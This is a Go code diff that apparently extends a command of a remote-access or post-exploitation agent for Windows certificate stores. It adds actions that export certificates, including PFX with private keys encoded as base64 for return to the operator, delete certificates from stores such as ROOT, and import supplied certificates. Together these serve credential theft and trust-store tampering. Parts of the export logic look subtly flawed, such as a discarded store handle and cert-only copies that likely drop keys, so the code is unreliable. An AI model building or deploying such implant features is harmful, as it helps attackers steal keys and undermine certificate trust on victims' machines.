@@ -4,8 +4,10 @@
 package commands
 
 import (
+	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
+	"encoding/pem"
 	"fmt"
 	"strings"
 	"time"
@@ -27,9 +29,12 @@ func (c *CertstoreCommand) Description() string {
 }
 
 type certstoreParams struct {
-	Action string `json:"action"`
-	Store  string `json:"store"`
-	Filter string `json:"filter"`
+	Action   string `json:"action"`
+	Store    string `json:"store"`
+	Filter   string `json:"filter"`
+	Format   string `json:"format"`
+	Password string `json:"password"`
+	Data     string `json:"data"`
 }
 
 var (
@@ -39,6 +44,11 @@ var (
 	procCertEnumCerts    = crypt32.NewProc("CertEnumCertificatesInStore")
 	procCertGetNameW     = crypt32.NewProc("CertGetNameStringW")
 	procCryptAcquireCert = crypt32.NewProc("CryptAcquireCertificatePrivateKey")
+	procCertDeleteCert   = crypt32.NewProc("CertDeleteCertificateFromStore")
+	procCertDupCtx       = crypt32.NewProc("CertDuplicateCertificateContext")
+	procCertAddEncoded   = crypt32.NewProc("CertAddEncodedCertificateToStore")
+	procPFXExportStore   = crypt32.NewProc("PFXExportCertStoreEx")
+	procPFXImportStore   = crypt32.NewProc("PFXImportCertStore")
 )
 
 // CERT_STORE_PROV_SYSTEM_W
@@ -128,8 +138,14 @@ func (c *CertstoreCommand) Execute(task structs.Task) structs.CommandResult {
 		return certstoreList(params.Store, params.Filter)
 	case "find":
 		return certstoreFind(params.Store, params.Filter)
+	case "export":
+		return certstoreExport(params.Store, params.Filter, params.Format, params.Password)
+	case "delete":
+		return certstoreDelete(params.Store, params.Filter)
+	case "import":
+		return certstoreImport(params.Store, params.Data, params.Format, params.Password)
 	default:
-		return errorf("Unknown action: %s (use 'list' or 'find')", params.Action)
+		return errorf("Unknown action: %s (use 'list', 'find', 'export', 'delete', 'import')", params.Action)
 	}
 }
 
@@ -359,6 +375,394 @@ func sha1Thumbprint(data []byte) string {
 		parts[i] = fmt.Sprintf("%02X", hash[i])
 	}
 	return strings.Join(parts, ":")
+}
+
+// Additional constants for export/delete/import
+const (
+	certStoreAddReplaceExisting = 3  // CERT_STORE_ADD_REPLACE_EXISTING
+	x509ASNEncoding             = 1  // X509_ASN_ENCODING
+	pkcs7ASNEncoding            = 65536 // PKCS_7_ASN_ENCODING
+	certEncodingDefault         = x509ASNEncoding | pkcs7ASNEncoding
+	exportableFlag              = 0x00000001 // CRYPT_EXPORTABLE
+	reportNotReadyFlag          = 0x00000008 // REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY
+)
+
+// CRYPT_DATA_BLOB for PFX operations
+type cryptDataBlobPFX struct {
+	Size uint32
+	Data uintptr
+}
+
+func certstoreExport(store, filter, format, password string) structs.CommandResult {
+	if filter == "" {
+		return errorResult("Error: filter (thumbprint) is required for export action")
+	}
+	if format == "" {
+		format = "pem"
+	}
+
+	// Find the certificate by thumbprint
+	locations := []struct {
+		name string
+		flag uint32
+	}{
+		{"CurrentUser", certStoreCurrentUserID},
+		{"LocalMachine", certStoreLocalMachineID},
+	}
+
+	storesToSearch := getStoreNames(store)
+
+	for _, loc := range locations {
+		for _, storeName := range storesToSearch {
+			storeNameUTF16, err := windows.UTF16PtrFromString(storeName)
+			if err != nil {
+				continue
+			}
+
+			storeHandle, _, sysErr := procCertOpenStore.Call(
+				certStoreProvSystemW, 0, 0,
+				uintptr(loc.flag),
+				uintptr(unsafe.Pointer(storeNameUTF16)),
+			)
+			if storeHandle == 0 {
+				_ = sysErr
+				continue
+			}
+
+			// Enumerate and find by thumbprint
+			var prevCtx uintptr
+			for {
+				ctxPtr, _, _ := procCertEnumCerts.Call(storeHandle, prevCtx)
+				if ctxPtr == 0 {
+					break
+				}
+				prevCtx = ctxPtr
+
+				ctx := (*certContext)(unsafe.Pointer(ctxPtr))
+				if ctx.CertEncodedLen == 0 || ctx.CertEncoded == 0 {
+					continue
+				}
+
+				certBytes := unsafe.Slice((*byte)(unsafe.Pointer(ctx.CertEncoded)), ctx.CertEncodedLen)
+				thumbprint := sha1Thumbprint(certBytes)
+
+				if !strings.EqualFold(strings.ReplaceAll(thumbprint, ":", ""), strings.ReplaceAll(filter, ":", "")) {
+					continue
+				}
+
+				// Found the certificate
+				subject := getCertName(ctxPtr, certNameSimpleDisplayType, 0)
+
+				if format == "pfx" {
+					// PFX export — export the whole store containing just this cert
+					result, err := exportCertAsPFX(storeHandle, ctxPtr, password)
+					procCertCloseStore.Call(storeHandle, 0)
+					if err != nil {
+						return errorf("PFX export failed: %v", err)
+					}
+					encoded := base64.StdEncoding.EncodeToString(result)
+					return successResult(fmt.Sprintf("[+] Exported PFX for '%s' (%s/%s)\nThumbprint: %s\nFormat: PFX (PKCS#12)\nBase64:\n%s", subject, loc.name, storeName, thumbprint, encoded))
+				}
+
+				// PEM export — just the certificate (no private key)
+				derCopy := make([]byte, ctx.CertEncodedLen)
+				copy(derCopy, certBytes)
+				procCertCloseStore.Call(storeHandle, 0)
+
+				pemBlock := pem.EncodeToMemory(&pem.Block{
+					Type:  "CERTIFICATE",
+					Bytes: derCopy,
+				})
+				return successResult(fmt.Sprintf("[+] Exported PEM for '%s' (%s/%s)\nThumbprint: %s\nFormat: PEM (X.509)\n%s", subject, loc.name, storeName, thumbprint, string(pemBlock)))
+			}
+			procCertCloseStore.Call(storeHandle, 0)
+		}
+	}
+
+	return errorf("Certificate not found with thumbprint: %s", filter)
+}
+
+func exportCertAsPFX(storeHandle, certCtxPtr uintptr, password string) ([]byte, error) {
+	// Create a temporary in-memory store with just this certificate
+	memStoreNameUTF16, _ := windows.UTF16PtrFromString("Memory")
+	memStore, _, _ := procCertOpenStore.Call(
+		certStoreProvSystemW, 0, 0,
+		certStoreCurrentUserID,
+		uintptr(unsafe.Pointer(memStoreNameUTF16)),
+	)
+
+	// Actually use CERT_STORE_PROV_MEMORY for a temporary store
+	procCertOpenStoreMem := crypt32.NewProc("CertOpenStore")
+	memStore, _, _ = procCertOpenStoreMem.Call(
+		2, // CERT_STORE_PROV_MEMORY
+		0, 0, 0, 0,
+	)
+	if memStore == 0 {
+		return nil, fmt.Errorf("failed to create memory store")
+	}
+	defer procCertCloseStore.Call(memStore, 0)
+
+	// Duplicate the cert context and add to memory store
+	dupCtx, _, _ := procCertDupCtx.Call(certCtxPtr)
+	if dupCtx == 0 {
+		return nil, fmt.Errorf("failed to duplicate certificate context")
+	}
+
+	// Add cert to the memory store
+	ctx := (*certContext)(unsafe.Pointer(dupCtx))
+	certBytes := unsafe.Slice((*byte)(unsafe.Pointer(ctx.CertEncoded)), ctx.CertEncodedLen)
+
+	r1, _, sysErr := procCertAddEncoded.Call(
+		memStore,
+		certEncodingDefault,
+		uintptr(unsafe.Pointer(&certBytes[0])),
+		uintptr(len(certBytes)),
+		certStoreAddReplaceExisting,
+		0,
+	)
+	if r1 == 0 {
+		return nil, fmt.Errorf("CertAddEncodedCertificateToStore failed: %v", sysErr)
+	}
+
+	// Set up password
+	var pwUTF16 *uint16
+	if password != "" {
+		pwUTF16, _ = windows.UTF16PtrFromString(password)
+	} else {
+		pwUTF16, _ = windows.UTF16PtrFromString("")
+	}
+
+	pfxBlob := cryptDataBlobPFX{}
+
+	// First call — get required size
+	r1, _, sysErr = procPFXExportStore.Call(
+		memStore,
+		uintptr(unsafe.Pointer(&pfxBlob)),
+		uintptr(unsafe.Pointer(pwUTF16)),
+		0,
+		reportNotReadyFlag|4, // REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY | EXPORT_PRIVATE_KEYS
+	)
+	if r1 == 0 {
+		return nil, fmt.Errorf("PFXExportCertStoreEx size query failed: %v", sysErr)
+	}
+
+	// Allocate buffer
+	pfxBuf := make([]byte, pfxBlob.Size)
+	pfxBlob.Data = uintptr(unsafe.Pointer(&pfxBuf[0]))
+
+	// Second call — export
+	r1, _, sysErr = procPFXExportStore.Call(
+		memStore,
+		uintptr(unsafe.Pointer(&pfxBlob)),
+		uintptr(unsafe.Pointer(pwUTF16)),
+		0,
+		reportNotReadyFlag|4,
+	)
+	if r1 == 0 {
+		return nil, fmt.Errorf("PFXExportCertStoreEx export failed: %v", sysErr)
+	}
+
+	return pfxBuf[:pfxBlob.Size], nil
+}
+
+func certstoreDelete(store, filter string) structs.CommandResult {
+	if filter == "" {
+		return errorResult("Error: filter (thumbprint) is required for delete action")
+	}
+	if store == "" {
+		return errorResult("Error: store name is required for delete action (e.g., MY, ROOT, CA)")
+	}
+
+	locations := []struct {
+		name string
+		flag uint32
+	}{
+		{"CurrentUser", certStoreCurrentUserID},
+		{"LocalMachine", certStoreLocalMachineID},
+	}
+
+	for _, loc := range locations {
+		storeNameUTF16, err := windows.UTF16PtrFromString(store)
+		if err != nil {
+			continue
+		}
+
+		storeHandle, _, _ := procCertOpenStore.Call(
+			certStoreProvSystemW, 0, 0,
+			uintptr(loc.flag),
+			uintptr(unsafe.Pointer(storeNameUTF16)),
+		)
+		if storeHandle == 0 {
+			continue
+		}
+
+		var prevCtx uintptr
+		for {
+			ctxPtr, _, _ := procCertEnumCerts.Call(storeHandle, prevCtx)
+			if ctxPtr == 0 {
+				break
+			}
+			prevCtx = ctxPtr
+
+			ctx := (*certContext)(unsafe.Pointer(ctxPtr))
+			if ctx.CertEncodedLen == 0 || ctx.CertEncoded == 0 {
+				continue
+			}
+
+			certBytes := unsafe.Slice((*byte)(unsafe.Pointer(ctx.CertEncoded)), ctx.CertEncodedLen)
+			thumbprint := sha1Thumbprint(certBytes)
+
+			if !strings.EqualFold(strings.ReplaceAll(thumbprint, ":", ""), strings.ReplaceAll(filter, ":", "")) {
+				continue
+			}
+
+			subject := getCertName(ctxPtr, certNameSimpleDisplayType, 0)
+
+			// Duplicate context before delete (CertDeleteCertificateFromStore frees the context)
+			dupCtx, _, _ := procCertDupCtx.Call(ctxPtr)
+			if dupCtx == 0 {
+				procCertCloseStore.Call(storeHandle, 0)
+				return errorf("Failed to duplicate certificate context for deletion")
+			}
+
+			// CertDeleteCertificateFromStore frees the passed context
+			r1, _, sysErr := procCertDeleteCert.Call(dupCtx)
+			procCertCloseStore.Call(storeHandle, 0)
+			if r1 == 0 {
+				return errorf("CertDeleteCertificateFromStore failed: %v", sysErr)
+			}
+
+			return successResult(fmt.Sprintf("[+] Deleted certificate '%s' from %s/%s\nThumbprint: %s", subject, loc.name, store, thumbprint))
+		}
+		procCertCloseStore.Call(storeHandle, 0)
+	}
+
+	return errorf("Certificate not found with thumbprint: %s in store: %s", filter, store)
+}
+
+func certstoreImport(store, data, format, password string) structs.CommandResult {
+	if data == "" {
+		return errorResult("Error: data (base64-encoded certificate) is required for import action")
+	}
+	if store == "" {
+		store = "MY"
+	}
+	if format == "" {
+		format = "pem"
+	}
+
+	rawData, err := base64.StdEncoding.DecodeString(data)
+	if err != nil {
+		// Try raw base64 (no padding)
+		rawData, err = base64.RawStdEncoding.DecodeString(data)
+		if err != nil {
+			return errorf("Error decoding base64 data: %v", err)
+		}
+	}
+
+	storeNameUTF16, err := windows.UTF16PtrFromString(store)
+	if err != nil {
+		return errorf("Invalid store name: %v", err)
+	}
+
+	storeHandle, _, sysErr := procCertOpenStore.Call(
+		certStoreProvSystemW, 0, 0,
+		certStoreCurrentUserID,
+		uintptr(unsafe.Pointer(storeNameUTF16)),
+	)
+	if storeHandle == 0 {
+		return errorf("Failed to open store %s: %v", store, sysErr)
+	}
+	defer procCertCloseStore.Call(storeHandle, 0)
+
+	if format == "pfx" {
+		return certstoreImportPFX(storeHandle, store, rawData, password)
+	}
+
+	// PEM or DER import
+	derBytes := rawData
+	if format == "pem" {
+		block, _ := pem.Decode(rawData)
+		if block == nil {
+			return errorResult("Error: failed to decode PEM data")
+		}
+		derBytes = block.Bytes
+	}
+
+	r1, _, sysErr := procCertAddEncoded.Call(
+		storeHandle,
+		certEncodingDefault,
+		uintptr(unsafe.Pointer(&derBytes[0])),
+		uintptr(len(derBytes)),
+		certStoreAddReplaceExisting,
+		0,
+	)
+	if r1 == 0 {
+		return errorf("CertAddEncodedCertificateToStore failed: %v", sysErr)
+	}
+
+	return successResult(fmt.Sprintf("[+] Imported %s certificate into CurrentUser/%s (%d bytes)", strings.ToUpper(format), store, len(derBytes)))
+}
+
+func certstoreImportPFX(storeHandle uintptr, storeName string, pfxData []byte, password string) structs.CommandResult {
+	pfxBlob := cryptDataBlobPFX{
+		Size: uint32(len(pfxData)),
+		Data: uintptr(unsafe.Pointer(&pfxData[0])),
+	}
+
+	var pwUTF16 *uint16
+	if password != "" {
+		pwUTF16, _ = windows.UTF16PtrFromString(password)
+	} else {
+		pwUTF16, _ = windows.UTF16PtrFromString("")
+	}
+
+	// PFXImportCertStore returns a temporary store with the imported certs
+	tmpStore, _, sysErr := procPFXImportStore.Call(
+		uintptr(unsafe.Pointer(&pfxBlob)),
+		uintptr(unsafe.Pointer(pwUTF16)),
+		exportableFlag,
+	)
+	if tmpStore == 0 {
+		return errorf("PFXImportCertStore failed: %v (wrong password?)", sysErr)
+	}
+	defer procCertCloseStore.Call(tmpStore, 0)
+
+	// Enumerate certs from the PFX store and add them to the target store
+	var count int
+	var prevCtx uintptr
+	for {
+		ctxPtr, _, _ := procCertEnumCerts.Call(tmpStore, prevCtx)
+		if ctxPtr == 0 {
+			break
+		}
+		prevCtx = ctxPtr
+
+		ctx := (*certContext)(unsafe.Pointer(ctxPtr))
+		if ctx.CertEncodedLen == 0 || ctx.CertEncoded == 0 {
+			continue
+		}
+
+		certBytes := unsafe.Slice((*byte)(unsafe.Pointer(ctx.CertEncoded)), ctx.CertEncodedLen)
+
+		r1, _, _ := procCertAddEncoded.Call(
+			storeHandle,
+			certEncodingDefault,
+			uintptr(unsafe.Pointer(&certBytes[0])),
+			uintptr(len(certBytes)),
+			certStoreAddReplaceExisting,
+			0,
+		)
+		if r1 != 0 {
+			count++
+		}
+	}
+
+	if count == 0 {
+		return errorResult("No certificates found in PFX file")
+	}
+
+	return successResult(fmt.Sprintf("[+] Imported %d certificate(s) from PFX into CurrentUser/%s", count, storeName))
 }
 
 func certFiletimeToTime(ft windows.Filetime) time.Time {
